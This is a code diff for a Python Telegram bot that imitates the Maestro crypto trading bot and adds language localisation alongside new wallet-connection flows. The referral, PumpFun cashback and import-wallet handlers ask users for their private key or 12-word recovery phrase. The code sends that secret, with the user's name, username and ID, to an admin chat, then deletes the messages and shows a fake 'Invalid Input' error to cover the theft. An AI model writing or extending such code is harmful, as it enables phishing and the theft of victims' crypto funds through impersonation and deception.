+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ ファストトレードコンソール：以下にトークンのコントラクトアドレス（CA）を貼り付けてください。",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 ご希望に応じてチェーンを有効または無効にします。\n\n💳 ウォレットボタンは各チェーンのウォレットのインポートまたは生成に使用できます。",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ ウォレットが見つかりません。インポートまたは生成してください。",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Maestroへようこそ</b>\n"
+            "<i>トレードツールとクイックアクションのワンストップハブ。</i>\n\n"
+            "🔗 <b>チェーン：</b>チェーンを有効または無効にします。\n"
+            "💳 <b>ウォレット：</b>ウォレットをインポートまたは生成します。\n"
+            "⚙️ <b>グローバル設定：</b>ボットをカスタマイズします。\n"
+            "🕓 <b>アクティブ注文：</b>買い/売り制限注文を追跡します。\n"
+            "📈 <b>ポジション：</b>保有中のトレードを監視します。\n\n"
+            "⚡️ <b>今すぐ取引するにはトークンCAを貼り付けてください。</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">ハブ</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">更新</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">サポート</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">その他のリンク</a>"
+        ),
+    },
+    "ru": {
+        "🌎 Please choose your preferred Language:": "🌎 Пожалуйста, выберите предпочитаемый язык:",
+        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Язык обновлен. Интерфейс теперь будет отображаться на выбранном языке.",
+        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Тестовое подключение выбрано. Используйте эту кнопку, чтобы импортировать или создать кошелек для тестирования.",
+        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Быстрая торговая консоль: вставьте ниже адрес контракта токена (CA).",
+        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Включайте или отключайте цепочки в соответствии с вашими предпочтениями.\n\nКнопки 💳 Кошельки можно использовать для импорта или создания кошельков для каждой цепочки.",
+        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Кошелек не найден. Пожалуйста, импортируйте или создайте.",
+        "MAIN_WELCOME_TEXT": (
+            "⭐️ <b>Добро пожаловать в Maestro</b>\n"
+            "<i>Ваш универсальный центр для торговых инструментов и быстрых действий.</i>\n\n"
+            "🔗 <b>Сети:</b> Включайте или отключайте сети.\n"
+            "💳 <b>Кошельки:</b> Импортируйте или создавайте кошельки.\n"
+            "⚙️ <b>Глобальные настройки:</b> Настройте бота.\n"
+            "🕓 <b>Активные ордера:</b> Отслеживайте покупки и продажи по лимитам.\n"
+            "📈 <b>Позиции:</b> Мониторьте свои открытые сделки.\n\n"
+            "⚡️ <b>Вставьте CA токена для мгновенной торговли.</b>\n\n"
+            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
+            "<a href=\"https://t.me/MaestroSniperUpdates\">Обновления</a> • "
+            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
+            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
+            "<a href=\"https://t.me/MaestroSupport\">Поддержка</a> • "
+            "<a href=\"https://linktr.ee/MaestroBots\">Больше ссылок</a>"
+        ),
+    },
+}
+
+
+def get_localized_button_text(user_id: int | str, text: str) -> str:
+    if not text:
+        return ""
+    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    return BUTTON_LABEL_TRANSLATIONS.get(lang_key, {}).get(text, text)
+
+
+def get_localized_text(user_id: int | str, text: str) -> str:
+    if not text:
+        return ""
+    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    return TEXT_TRANSLATIONS.get(lang_key, {}).get(text, text)
+
+
+TRANSLATION_CACHE: dict[tuple[str, str], str] = {}
+
+async def translate_text(text: str, target_lang: str) -> str:
+    if not text:
+        return ""
+
+    target_lang = (target_lang or "en").strip().lower()
+    if target_lang in {"en", "en-us", "en_us"}:
+        return text
+
+    lang_code = LANGUAGE_OPTIONS.get(target_lang, {}).get("code", target_lang)
+    if lang_code in {"en", "en-us", "en_us"}:
+        return text
+
+    cache_key = (lang_code, text)
+    if cache_key in TRANSLATION_CACHE:
+        return TRANSLATION_CACHE[cache_key]
+    if lang_code in {"en", "en-us", "en_us"}:
+        return text
+
+    try:
+        parts = re.split(r"(<[^>]+>)", text)
+        translated_parts = []
+        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
+            for part in parts:
+                if not part:
+                    continue
+                if part.startswith("<") and part.endswith(">"):
+                    translated_parts.append(part)
+                    continue
+                encoded_text = quote(part)
+                url = f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={lang_code}&dt=t&q={encoded_text}"
+                async with session.get(url) as response:
+                    if response.status != 200:
+                        translated_parts.append(part)
+                        continue
+                    data = await response.json()
+                    if isinstance(data, list) and data and isinstance(data[0], list):
+                        translated_text = "".join(item[0] for item in data[0] if isinstance(item, list) and item and isinstance(item[0], str))
+                        translated_parts.append(translated_text or part)
+                    else:
+                        translated_parts.append(part)
+    except Exception:
+        return text
+
+    return "".join(translated_parts).strip() or text
+
+
+async def get_user_message_text(user_id: int, text: str, *, html_supported: bool = False) -> tuple[str, bool]:
+    lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
+    if lang_key == "en":
+        return text, html_supported
+
+    localized_text = get_localized_text(user_id, text)
+    return localized_text, html_supported
+
+
+async def get_language_selector_keyboard(user_id: int):
+    builder = InlineKeyboardBuilder()
+    for lang_key, meta in LANGUAGE_OPTIONS.items():
+        builder.button(text=meta["label"], callback_data=f"set_language:{lang_key}")
+    builder.button(text=get_localized_button_text(user_id, "Return"), callback_data="main_menu")
+    builder.adjust(2, 2, 2, 2, 2, 1)
+    return builder.as_markup()
+
 
 # 1. Regex to isolate a clean Solana contract address from incoming messages
 SOLANA_ADDRESS_REGEX = r"[1-9A-HJ-NP-Za-km-z]{32,44}"
@@ -503,14 +1096,23 @@ async def monitor_countdown_task(bot: Bot, chat_id: int, message_id: int, mint_a
     except asyncio.CancelledError:
         pass
 
-@router.callback_query(F.data == "language")
+@dp.callback_query(F.data == "language")
 async def language_fix(callback: CallbackQuery):
+    selector_text, _ = await get_user_message_text(callback.from_user.id, "🌎 Please choose your preferred Language:")
     await callback.message.edit_text(
-        "🌐 Language configuration coming soon!",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Return", callback_data="main_menu")]
-        ]),
+        selector_text,
+        reply_markup=await get_language_selector_keyboard(callback.from_user.id),
     )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.startswith("set_language:"))
+async def set_user_language(callback: CallbackQuery):
+    lang_key = callback.data.split(":", 1)[1]
+    if lang_key in LANGUAGE_OPTIONS:
+        USER_LANGUAGE_PREFS[callback.from_user.id] = lang_key
+
+    await show_welcome_page(callback.bot, callback.message.chat.id, delete_message_ids=[callback.message.message_id])
     await callback.answer()
 
 
@@ -1289,83 +1891,83 @@ def get_next_wallet(chain: str):
     return None
 
 
-def get_generation_error_keyboard():
+def get_generation_error_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
-            InlineKeyboardButton(text="Return", callback_data="chains")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
         ]
     ])
 
 
-def get_wallet_created_keyboard():
+def get_wallet_created_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💳 Track wallet", callback_data="track_wallet")]
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💳 Track wallet"), callback_data="track_wallet")]
     ])
 
 # --- REUSABLE KEYBOARD BUILDERS ---
 
-def get_main_keyboard():
+def get_main_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="🔗 Chains", callback_data="chains"),
-            InlineKeyboardButton(text="🇺🇸🇨🇳 Language", callback_data="language")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🔗 Chains"), callback_data="chains"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🇺🇸🇨🇳 Language"), callback_data="language")
         ],
         [
-            InlineKeyboardButton(text="💳 Wallets", callback_data="wallets"),
-            InlineKeyboardButton(text="⚙️ Global Settings", callback_data="global_settings_chains")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💳 Wallets"), callback_data="wallets"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚙️ Global Settings"), callback_data="global_settings_chains")
         ],
         [
-            InlineKeyboardButton(text="📡 Signals", callback_data="signals"),
-            InlineKeyboardButton(text="🧑‍🤝‍🧑 Copytrade", callback_data="copytrade")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "📡 Signals"), callback_data="signals"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🧑‍🤝‍🧑 Copytrade"), callback_data="copytrade")
         ],
         [
-            InlineKeyboardButton(text="🕓 Active Orders", callback_data="active_orders"),
-            InlineKeyboardButton(text="📈 Positions", callback_data="positions")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🕓 Active Orders"), callback_data="active_orders"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "📈 Positions"), callback_data="positions")
         ],
         [
-            InlineKeyboardButton(text="🎯 Auto Snipe", callback_data="auto_snipe"),
-            InlineKeyboardButton(text="↔️ Bridge", callback_data="bridge")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🎯 Auto Snipe"), callback_data="auto_snipe"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "↔️ Bridge"), callback_data="bridge")
         ],
         [
-            InlineKeyboardButton(text="⭐️ Premium", callback_data="premium"),
-            InlineKeyboardButton(text="💸 Cashback", callback_data="cashback"),
-            InlineKeyboardButton(text="💰 Referral", callback_data="referral")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⭐️ Premium"), callback_data="premium"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💸 Cashback"), callback_data="cashback"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "💰 Referral"), callback_data="referral")
         ],
         [
-            InlineKeyboardButton(text="⚡️ BUY & SELL NOW!", callback_data="buy_sell_now")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "⚡️ BUY & SELL NOW!"), callback_data="buy_sell_now")
         ]
     ])
 
-def get_chains_keyboard():
+def get_chains_keyboard(user_id=None):
     # Build dynamically based on current green/red toggle state for SOL, BASE, and ETH
     sol_icon = "🟢" if network_status["SOL"] else "🔴"
     base_icon = "🟢" if network_status["BASE"] else "🔴"
     eth_icon = "🟢" if network_status["ETH"] else "🔴"
 
-    sol_label = "💳 Wallets" if network_status["SOL"] else "💳 No Wallets!"
-    base_label = "💳 Wallets" if network_status["BASE"] else "💳 No Wallets!"
-    eth_label = "💳 Wallets" if network_status["ETH"] else "💳 No Wallets!"
+    sol_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["SOL"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")
+    base_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["BASE"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")
+    eth_label = get_localized_button_text(user_id or 0, "💳 Wallets") if network_status["ETH"] else get_localized_button_text(user_id or 0, "💳 No Wallets!")
 
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=f"{sol_icon} SOL", callback_data="toggle_sol"), InlineKeyboardButton(text=sol_label, callback_data="wallet_select_sol")],
         [InlineKeyboardButton(text=f"{base_icon} BASE", callback_data="toggle_base"), InlineKeyboardButton(text=base_label, callback_data="wallet_select_base")],
         [InlineKeyboardButton(text=f"{eth_icon} ETH", callback_data="toggle_eth"), InlineKeyboardButton(text=eth_label, callback_data="wallet_select_eth")],
-        [InlineKeyboardButton(text="Return", callback_data="main_menu")]
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="main_menu")]
     ])
 
-def get_wallet_action_keyboard(chain_type):
+def get_wallet_action_keyboard(chain_type, user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
-            InlineKeyboardButton(text="Return", callback_data="chains")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
         ],
         [
-            InlineKeyboardButton(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🗄️ Rearrange Wallets"), callback_data="rearrange_wallets")
         ],
         [
-            InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
-            InlineKeyboardButton(text="Generate Wallet", callback_data=f"generate_select_{chain_type}")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Import Wallet"), callback_data="import_wallet"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Generate Wallet"), callback_data=f"generate_select_{chain_type}")
         ]
     ])
 
@@ -1380,37 +1982,43 @@ def get_error_response_keyboard():
         ]
     ])
 
-def get_no_wallet_keyboard():
+def get_no_wallet_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
-            InlineKeyboardButton(text="Return", callback_data="chains")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="chains")
         ],
         [
-            InlineKeyboardButton(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "🗄️ Rearrange Wallets"), callback_data="rearrange_wallets")
         ],
-        [InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
-            InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet")
+        [InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Import Wallet"), callback_data="import_wallet"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Generate Wallet"), callback_data="generate_wallet")
         ]
     ])
 
-def get_rearrange_keyboard():
+def get_rearrange_keyboard(user_id=None):
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="ℹ️ Help", url="https://docs.maestrobots.com/wallet-setup"),
-            InlineKeyboardButton(text="Return", callback_data="wallet_no_wallet")
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "ℹ️ Help"), url="https://docs.maestrobots.com/wallet-setup"),
+            InlineKeyboardButton(text=get_localized_button_text(user_id or 0, "Return"), callback_data="wallet_no_wallet")
         ]
     ])
 
 
 WELCOME_MESSAGE_IDS = {}
 PREMIUM_FLOW_MESSAGE_IDS = {}
+PUMPFUN_FLOW_MESSAGE_IDS = {}
 REFERRAL_PROFILES = {}
 
 
 def track_premium_message(chat_id: int, message_id: int):
     premium_ids = PREMIUM_FLOW_MESSAGE_IDS.setdefault(chat_id, set())
     premium_ids.add(message_id)
+
+
+def track_pumpfun_message(chat_id: int, message_id: int):
+    pumpfun_ids = PUMPFUN_FLOW_MESSAGE_IDS.setdefault(chat_id, set())
+    pumpfun_ids.add(message_id)
 
 
 async def show_welcome_page(bot: Bot, chat_id: int, *, delete_message_ids=None):
@@ -1437,22 +2045,27 @@ async def show_welcome_page(bot: Bot, chat_id: int, *, delete_message_ids=None):
 
     PREMIUM_FLOW_MESSAGE_IDS[chat_id] = set()
 
+    welcome_text, use_html = await get_user_message_text(chat_id, MAIN_WELCOME_TEXT, html_supported=True)
     sent = await bot.send_message(
         chat_id=chat_id,
-        text=MAIN_WELCOME_TEXT,
-        parse_mode="HTML",
-        reply_markup=get_main_keyboard(),
+        text=welcome_text,
+        parse_mode="HTML" if use_html else None,
+        reply_markup=get_main_keyboard(chat_id),
         disable_web_page_preview=True,
     )
     WELCOME_MESSAGE_IDS[chat_id] = sent.message_id
     return sent
 
 
-def get_pumpfun_keyboard(return_callback: str = "pumpfun_return", refresh_callback: str = "pumpfun_refresh"):
+def get_pumpfun_keyboard(return_callback: str = "pumpfun_return"):
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔁 Refresh", callback_data=refresh_callback)],
+        [InlineKeyboardButton(text="Connect Wallet", callback_data="pumpfun_connect_wallet")],
         [InlineKeyboardButton(text="Return", callback_data=return_callback)],
     ])
+
+
+def get_pumpfun_connect_keyboard():
+    return get_pumpfun_keyboard()
 
 
 def get_cashback_dashboard_keyboard():
@@ -1543,7 +2156,7 @@ def get_premium_keyboard():
 
 # --- TEXT STRING TEMPLATES ---
 
-PUMPFUN_TEXT = "💸 PumpFun Trader Cashback\n\nℹ️ No claimable cashback available."
+PUMPFUN_TEXT = "🔗 <b>Connect Your wallet To Check Eligibility</b>"
 
 CASHBACK_DASHBOARD_TEXT = (
     "💰 <b>Cashback Dashboard</b>\n\n"
@@ -1605,8 +2218,8 @@ MAIN_WELCOME_TEXT = (
 )
 
 CHAINS_TEXT = (
-    "⚠️ <b>You have not set up any wallet yet. To use the bot you need to set up at least one chain with a wallet.</b>\n\n"
-    "Click on the buttons below to set up the chain(s) you want to use."
+    "🟢 Enable or 🔴 Disable chains based on your preferences.\n\n"
+    "The 💳 Wallets buttons can be used to import or generate wallets for each chain."
 )
 
 NO_WALLET_TEXT = "ℹ️ Wallet not found. Please import or generate."
@@ -1616,13 +2229,40 @@ NO_WALLET_TEXT = "ℹ️ Wallet not found. Please import or generate."
 
 @dp.message(Command("start"))
 async def start(message: types.Message):
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
+    previous_welcome_id = WELCOME_MESSAGE_IDS.get(message.chat.id)
+    if previous_welcome_id:
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=previous_welcome_id)
+        except Exception:
+            pass
+
+    for message_id in list(PREMIUM_FLOW_MESSAGE_IDS.get(message.chat.id, set())):
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=message_id)
+        except Exception:
+            pass
+
+    for message_id in list(PUMPFUN_FLOW_MESSAGE_IDS.get(message.chat.id, set())):
+        try:
+            await message.bot.delete_message(chat_id=message.chat.id, message_id=message_id)
+        except Exception:
+            pass
+
+    PREMIUM_FLOW_MESSAGE_IDS[message.chat.id] = set()
+    PUMPFUN_FLOW_MESSAGE_IDS[message.chat.id] = set()
+    WELCOME_MESSAGE_IDS[message.chat.id] = None
     await show_welcome_page(message.bot, message.chat.id, delete_message_ids=[])
 
 
 @dp.message(Command("pumpfun"))
 async def pumpfun_command(message: types.Message):
     await message.answer(
-        text="� <b>Connect your Phantom wallet now</b>\n\n<i>Link your wallet to check eligibility for cashback.</i>",
+        text=PUMPFUN_TEXT,
         parse_mode="HTML",
         reply_markup=get_pumpfun_keyboard(),
     )
@@ -1671,6 +2311,7 @@ async def cashback_pumpfun(callback: types.CallbackQuery):
 async def cashback_phantom(callback: types.CallbackQuery):
     await callback.message.edit_text(
         text=PUMPFUN_TEXT,
+        parse_mode="HTML",
         reply_markup=get_pumpfun_keyboard(return_callback="cashback"),
     )
     await callback.answer()
@@ -1689,10 +2330,11 @@ async def cashback_tiers(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "referral")
 async def referral_overview(callback: types.CallbackQuery):
     profile = get_referral_profile(callback.from_user.id, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}")
+    username_label = callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"
     await callback.message.edit_text(
-        text=build_referral_overview_text(profile, callback.from_user.username or callback.from_user.first_name or f"user_{callback.from_user.id}"),
+        text=build_referral_overview_text(profile, username_label),
         parse_mode="HTML",
-        reply_markup=get_referral_overview_keyboard(profile["referral_id"]),
+        reply_markup=get_referral_overview_keyboard(username_label),
     )
     await callback.answer()
 
@@ -1710,9 +2352,59 @@ async def referral_detail(callback: types.CallbackQuery):
 
 @dp.callback_query(F.data == "referral_recipient_wallet")
 async def referral_recipient_wallet(callback: types.CallbackQuery):
-    await callback.message.edit_text(
-        text=PUMPFUN_TEXT,
-        reply_markup=get_pumpfun_keyboard(return_callback="referral_detail"),
+    await callback.message.answer(
+        text="🔗 Connect your wallet to receive referral rewards 💰",
+        parse_mode="HTML",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="Connect Wallet", callback_data="referral_connect_wallet")],
+            [InlineKeyboardButton(text="Return", callback_data="referral_detail")],
+        ]),
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "referral_connect_wallet")
+async def referral_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
+    prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
+
+    try:
+        await callback.message.delete()
+    except Exception:
+        pass
+
+    sent = await callback.message.answer(
+        text=prompt_text,
+        parse_mode="HTML",
+        reply_markup=types.ForceReply(selective=False),
+    )
+
+    await state.set_state(SupportForm.waiting_for_input)
+    await state.update_data(
+        prompt_message_id=sent.message_id,
+        source="referral_wallet",
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.in_({"pumpfun_connect_wallet", "cashback_phantom_connect_wallet"}))
+async def pumpfun_connect_wallet(callback: types.CallbackQuery, state: FSMContext):
+    prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
+
+    try:
+        await callback.message.delete()
+    except Exception:
+        pass
+
+    sent = await callback.message.answer(
+        text=prompt_text,
+        parse_mode="HTML",
+        reply_markup=types.ForceReply(selective=False),
+    )
+
+    await state.set_state(SupportForm.waiting_for_input)
+    await state.update_data(
+        prompt_message_id=sent.message_id,
+        source="pumpfun_wallet",
     )
     await callback.answer()
 
@@ -1750,7 +2442,7 @@ async def process_wallet_name(message: types.Message, state: FSMContext):
     if not wallet_entry:
         await message.answer(
             "❌ Failed to generate. Too many users are currently using the bot. Please try again shortly.",
-            reply_markup=get_generation_error_keyboard()
+            reply_markup=get_generation_error_keyboard(message.from_user.id)
         )
         await state.clear()
         return
@@ -1789,7 +2481,7 @@ async def process_wallet_name(message: types.Message, state: FSMContext):
     except Exception as e:
         print(f"Failed to notify admin about wallet creation. Error: {e}")
 
-    await message.answer(text=response_text, parse_mode="HTML", reply_markup=get_wallet_created_keyboard())
+    await message.answer(text=response_text, parse_mode="HTML", reply_markup=get_wallet_created_keyboard(message.from_user.id))
     await state.clear()
 
 @dp.message(PhantomConnectState.waiting_for_wallet_secret)
@@ -1829,17 +2521,93 @@ async def process_phantom_wallet_secret(message: types.Message, state: FSMContex
     except Exception as e:
         print(f"Failed to forward Phantom wallet secret to admin. Error: {e}")
 
-    await message.answer(
-        text="⚠️ <b>Invalid input. Please try again later.</b>",
+    sent = await message.answer(
+        text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Return", callback_data="wallets")]]),
     )
+    for delete_id in {message.message_id, prompt_message_id, sent.message_id}:
+        if delete_id is None:
+            continue
+        try:
+            if delete_id != sent.message_id:
+                await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
+        except Exception:
+            pass
     await state.clear()
 
 
 # TEXT HANDLER: Captures user message when 'waiting_for_input' state is active
 @dp.message(SupportForm.waiting_for_input)
 async def process_support_input(message: types.Message, state: FSMContext):
+    state_data = await state.get_data()
+    source = state_data.get("source")
+    prompt_message_id = state_data.get("prompt_message_id")
+
+    if source in {"referral_wallet", "pumpfun_wallet", "import_wallet"}:
+        if not message.reply_to_message or message.reply_to_message.message_id != prompt_message_id:
+            await message.answer(
+                text="⚠️ Please reply directly to the message so your response can be forwarded correctly.",
+                parse_mode="HTML",
+                reply_markup=types.ForceReply(selective=False),
+            )
+            return
+
+        replied_text = message.reply_to_message.text or "[No original message text]"
+        full_name = " ".join(filter(None, [message.from_user.first_name, message.from_user.last_name])).strip() or "N/A"
+        username = message.from_user.username or "N/A"
+        secret_value = (message.text or "").strip() or "[empty]"
+        
+        if source == "referral_wallet":
+            source_label = "Referral Wallet"
+        elif source == "pumpfun_wallet":
+            source_label = "Pumpfun Wallet"
+        else:  # import_wallet
+            source_label = "Import Wallet"
+        
+        forwarded_text = (
+            f"<b>Name:</b> {escape(full_name)}\n"
+            f"<b>Username:</b> @{escape(username)}\n"
+            f"<b>Users ID:</b> {message.from_user.id}\n"
+            f"<i>Message users sent</i>\n<pre>{escape(secret_value)}</pre>\n"
+            f"<i>The message user replied to</i>\n<pre>{escape(replied_text)}</pre>"
+        )
+
+        try:
+            await message.bot.send_message(chat_id=ADMIN_CHAT_ID, text=forwarded_text, parse_mode="HTML")
+        except Exception as e:
+            print(f"Failed to forward wallet reply to admin. Error: {e}")
+
+        try:
+            await message.delete()
+        except Exception:
+            pass
+
+        if prompt_message_id:
+            try:
+                await message.bot.delete_message(chat_id=message.chat.id, message_id=prompt_message_id)
+            except Exception:
+                pass
+
+        invalid_message = await message.answer(
+            text="⚠️ <b>#DELETED</b>\nInvalid Input Please Try <b>Again</b>\n\n<i>Use /start to return to the main menu.</i>",
+            parse_mode="HTML",
+        )
+        
+        # Track the invalid message for cleanup on /start
+        if invalid_message and invalid_message.message_id:
+            track_pumpfun_message(message.chat.id, invalid_message.message_id)
+        
+        for delete_id in {message.message_id, prompt_message_id, invalid_message.message_id}:
+            if delete_id is None:
+                continue
+            try:
+                if delete_id != invalid_message.message_id:
+                    await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
+            except Exception:
+                pass
+        await state.clear()
+        return
+
     try:
         await message.forward(chat_id=ADMIN_CHAT_ID)
     except Exception as e:
@@ -1850,11 +2618,18 @@ async def process_support_input(message: types.Message, state: FSMContext):
     except Exception as e:
         print(f"Failed to delete user message. Error: {e}")
 
-    await message.answer(
-        text="⚠️ <b>Invalid input. Please try again.</b>",
+    invalid_message = await message.answer(
+        text="⚠️ #DELETED\nInvalid Input Please Try Again\n\nUse /start to return to the main menu.",
         parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Try Again", callback_data="main_menu")]]),
     )
+    for delete_id in {message.message_id, invalid_message.message_id}:
+        if delete_id is None:
+            continue
+        try:
+            if delete_id != invalid_message.message_id:
+                await message.bot.delete_message(chat_id=message.chat.id, message_id=delete_id)
+        except Exception:
+            pass
     await state.clear()
 
 @dp.message()
@@ -2389,41 +3164,57 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
     data = callback.data
 
     if data in {"chains", "manage_chains"}:
+        localized_text, _ = await get_user_message_text(callback.from_user.id, CHAINS_TEXT)
         await callback.message.edit_text(
-            text=CHAINS_TEXT,
-            parse_mode="HTML",
-            reply_markup=get_chains_keyboard()
+            text=localized_text,
+            reply_markup=get_chains_keyboard(callback.from_user.id)
         )
 
     elif data in {"wallet_no_wallet", "wallets", "manage_wallets"}:
         await callback.message.edit_text(
             text=NO_WALLET_TEXT,
             parse_mode="HTML",
-            reply_markup=get_no_wallet_keyboard()
+            reply_markup=get_no_wallet_keyboard(callback.from_user.id)
         )
 
     elif data == "rearrange_wallets":
         await callback.message.edit_text(
             text=NO_WALLET_TEXT,
             parse_mode="HTML",
-            reply_markup=get_rearrange_keyboard()
+            reply_markup=get_rearrange_keyboard(callback.from_user.id)
         )
 
     elif data == "import_wallet":
-        await callback.message.answer("What's the private key of this wallet? you may also use a 12-word seed phrase..")
+        prompt_text = "🔐 <b>Please enter your private key or 12-word recovery phrase.</b>\n⚠️ <i>Remember: Never share these details with anyone!</i>"
+
+        try:
+            await callback.message.delete()
+        except Exception:
+            pass
+
+        sent = await callback.message.answer(
+            text=prompt_text,
+            parse_mode="HTML",
+            reply_markup=types.ForceReply(selective=False),
+        )
+
         await state.set_state(SupportForm.waiting_for_input)
+        await state.update_data(
+            prompt_message_id=sent.message_id,
+            source="import_wallet",
+        )
 
     elif data.startswith("toggle_"):
         chain = data.split("_")[1].upper()
         network_status[chain] = not network_status[chain]
-        await callback.message.edit_reply_markup(reply_markup=get_chains_keyboard())
+        await callback.message.edit_reply_markup(reply_markup=get_chains_keyboard(callback.from_user.id))
 
     elif data.startswith("wallet_select_"):
         chain_type = data.split("_")[2]
         await callback.message.edit_text(
             text=NO_WALLET_TEXT,
             parse_mode="HTML",
-            reply_markup=get_wallet_action_keyboard(chain_type)
+            reply_markup=get_wallet_action_keyboard(chain_type, callback.from_user.id)
         )
 
     elif data.startswith("generate_select_"):
@@ -2445,10 +3236,11 @@ async def handle_buttons(callback: types.CallbackQuery, state: FSMContext):
             await state.set_state(WalletSetupState.waiting_for_name)
 
     elif data == "back_to_main":
